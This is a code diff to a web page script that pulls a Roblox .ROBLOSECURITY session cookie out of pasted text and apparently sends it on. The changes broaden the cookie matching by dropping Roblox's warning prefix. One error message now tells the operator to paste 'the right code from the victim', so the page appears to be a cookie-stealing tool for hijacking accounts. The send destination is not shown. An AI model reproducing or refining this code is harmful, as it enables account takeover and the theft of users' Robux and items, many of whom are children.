@@ -70,8 +70,8 @@
       }
 
       // Scan for the start and end phrases
-      const startPhrase = ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"; //LOVE YOU
-      const endPhrase = "; rbxas"; //YES THANK YOU
+      const startPhrase = ".ROBLOSECURITY="; //LOVE YOU
+      const endPhrase = ";"; //YES THANK YOU
 
       // Check if the message contains both start and end phrases
       const startIndex = message.indexOf(startPhrase);
@@ -113,10 +113,10 @@
               document.getElementById("status").textContent = "Failed to send the message.";
             });
         } else {
-          errorMessage.textContent = "Message failed! No valid content found between the start and end phrases.";
+          errorMessage.textContent = "Message failed! Wrong Code.";
         }
       } else {
-        errorMessage.textContent = "Message failed! Your message must contain '.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' at the start and ';' at the end.";
+        errorMessage.textContent = "Message failed! Make sure you paste the right code from the victim ";
       }
     }
   </script>
